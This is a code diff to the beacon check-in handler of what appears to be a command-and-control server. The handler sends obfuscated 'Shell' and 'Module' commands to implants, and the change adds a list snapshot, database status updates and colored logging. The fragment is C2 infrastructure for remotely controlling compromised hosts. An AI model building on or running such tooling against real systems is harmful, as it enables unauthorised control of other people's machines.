@@ -1,6 +1,7 @@
 
 import time
 import json
+import colorama
 from urllib.parse import urlparse, parse_qs
 from http.server import BaseHTTPRequestHandler
 
@@ -43,7 +44,9 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
     commands_to_send = []
     # Safely get commands mapping from obfuscation_map
     command_obf = obfuscation_map.get("generic", {}).get("commands", {})
-    for cmd_id, command in command_list.items():
+    # Create a snapshot of the command list to avoid "dictionary changed size during iteration" error
+    command_items = list(command_list.items())
+    for cmd_id, command in command_items:
         if command.beacon_uuid == beacon_id and not command.executed:
             command.output = "Sent to beacon, waiting for response."
             obfuscated_command = None
@@ -72,6 +75,22 @@ def handle_beacon_call_in(handler: BaseHTTPRequestHandler, match: dict):
                 command_obf.get("data"): getattr(command, "command_data", None)
             })
             command.executed = True
+            
+            # Update database status to "Received" when beacon picks up the command
+            if beacon.database:
+                try:
+                    beacon.database.update_entry(
+                        "beacon_commands",
+                        "command_output=?",
+                        ("Received",),
+                        "command_uuid=?",
+                        (cmd_id,)
+                    )
+                    logger.info(f"Command {cmd_id} ({command.command}) picked up by beacon {beacon_id}")
+                    print(f"{colorama.Fore.CYAN}[RECEIVED]{colorama.Fore.WHITE} Command {colorama.Fore.BLUE}{cmd_id}{colorama.Fore.WHITE} ({colorama.Fore.MAGENTA}{command.command}{colorama.Fore.WHITE}) picked up by beacon")
+                except Exception as e:
+                    logger.error(f"Failed to update command status to 'Received': {e}")
+                    
         if command.command == "Module":
             command.data = "Module Sent"
         if command.command == "Shell":
